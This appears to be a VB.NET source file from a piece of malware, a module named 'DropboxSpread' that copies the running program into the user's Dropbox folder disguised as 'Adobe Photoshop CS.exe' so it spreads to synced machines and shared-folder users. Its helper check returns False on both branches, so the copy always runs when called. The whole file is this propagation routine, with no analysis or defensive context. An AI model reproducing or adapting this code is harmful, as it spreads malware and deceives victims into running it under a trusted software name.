Imports System.IO

Namespace Spreads
    Module DropboxSpread
        Dim DropboxFolder = Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "Dropbox")
        Public Function SpreadFile()
            Try
                If (GetDropbox() = False) Then
                    If File.Exists(Path.Combine(DropboxFolder, "Adobe Photoshop CS.exe")) Then
                        IO.File.Delete(Path.Combine(DropboxFolder, "Adobe Photoshop CS.exe"))
                    End If
                    File.Copy(Application.ExecutablePath, Path.Combine(DropboxFolder, "Adobe Photoshop CS.exe"), True)
                    Return True
                Else
                    Return False
                End If
            Catch ex As Exception
                Return False
            End Try
        End Function
        Public Function GetDropbox()
            If Not (Directory.Exists(DropboxFolder)) Then
                Return False
            Else
                Return False
            End If
        End Function
    End Module
End Namespace